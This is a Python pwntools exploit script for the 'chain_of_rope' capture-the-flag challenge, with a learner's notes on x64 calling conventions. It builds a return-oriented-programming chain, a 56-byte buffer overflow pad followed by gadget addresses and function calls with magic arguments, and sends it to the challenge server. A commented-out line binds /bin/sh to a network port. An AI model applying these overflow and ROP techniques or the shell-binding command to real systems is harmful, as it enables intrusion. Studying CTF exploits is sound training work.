#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import base64
from pwn import *
import time

'''
Final questions
What are the different ROP gadgets for?
how do you attach pwntools to gdb?
'''

'''
NOTES:
x64
NX enabled but NO PIE @ 0x40000
ssh team3850@shell.actf.co 19400
nc shell.actf.co 19400
character array is 32
offset of 64,128,256 bytes is at $rsp --> 0x41416341 --> OFFSET AT 56
set userToken then balance then pin and secrete
You need to understand calling convention to find the correct gadget to rebuild the stack
x64 --> rdi, rsi, rdx, rcx, r8, r9
x32 --> eax, ebx, ecx, edx, esi, edi, ebp
https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64
POP NEEDS TO EAT SOMETHING
YOU CANT POP A POP
ALSO FEED POP NO MATTER WHAT
'''

#set environment
context.terminal = 'bash'
#context.log_level = 'debug'
#context.arch = 'amd64'

DEBUG = 0

#conn = process('./chain_of_rope')
if DEBUG:
    #attach gdb to process
    conn = process('./chain_of_rope', env={"LD_PRELOAD": "./libc.so.6"})
    gdb.attach(conn)
    #HOW DO YOU RUN THE EXPLOIT AND ATTACH TO GDB PROCESS TO DEBUG?
    '''
    server = process(['nc', 'tcp-listen:1234,fork,reuseaddr', 'exec:/bin/sh'])
    io = remote('localhost', 1234)
    gdb.attach(io)
    '''
else:
    #remotely connect to the challenge
    conn = remote('shell.actf.co', 19400)


###Function addresses
#+----------------------------------+
authorize = 0x401196 #1st
addBalance = 0x4011ab #2nd
flag = 0x4011eb #3rd
getInfo = 0x401252 #tester
#+----------------------------------+
###Args & globals
userToken = 0x1337 #set first in func --> @addr =
pin1 = 0xdeadbeef #set parameter to balance --> @addr =
balance = 0x4242 #set next in func --> @addr =
secret = 0xbedabb1e #set 3rd in arg --> @addr =
pin2 = 0xba5eba11 #set 4th in arg --> @addr =
#+----------------------------------+
###Gadgets
pop_rdi_ret = 0x401403
pop_rsi_r15_ret = 0x401401
ret = 0x40101a
pop_r14_pop_r15_ret = 0x0401400
pop_r14_ret = 0x401402
#+----------------------------------+

#Create payload
#+----------------------------------+
payload = ''

#add junk to fill stack and ebp
payload += "A"*56

###AUTHORIZE
#add address of authorize to rip                           
payload += p64(authorize)

###ADDBALANCE
#reform stack using pop ret
payload += p64(pop_rdi_ret)
#pass pin parameter
payload += p64(pin1)
#call addBalance
payload += p64(addBalance)


#test that prev function calls worked --> IT WORKED
#payload += p64(getInfo)

#Put on hold to use the getInfo() function to determine if the variables are set correctly

###FLAG
#two args gadget            
payload += p64(pop_rdi_ret)  
payload += p64(pin2)                   #!!!!!!!!!!!!!!!!!
payload += p64(pop_rsi_r15_ret)                                   
#pass parameters 
                          
payload += p64(secret)
payload += p64(secret) #fill r15 with garbage
#call flag
payload += p64(flag)

#+----------------------------------+

#deploy payload
#+----------------------------------+
time.sleep(2)

#Select menu option
conn.sendline('1')

conn.sendline(payload)

conn.interactive()
#+----------------------------------+

















'''saved incase i screw it up bad
payload = ''

#add junk to fill stack and ebp
payload += "A"*56

###AUTHORIZE
#add address of authorize to rip                           
payload += p64(authorize)

###ADDBALANCE
#reform stack using pop ret
payload += p64(pop_rdi_ret)
#pass pin parameter
payload += p64(pin1)
#call addBalance
payload += p64(addBalance)

#test that prev function calls worked --> IT WORKED
#payload += p64(getInfo)

#Put on hold to use the getInfo() function to determine if the variables are set correctly

###FLAG
#two args gadget            
payload += p64(pop_rdi_ret)                   #!!!!!!!!!!!!!!!!!
payload += p64(pop_r14_ret)                                   
#pass parameters 
payload += p64(pin2)                            
payload += p64(secret)
#call flag
payload += p64(flag)
'''
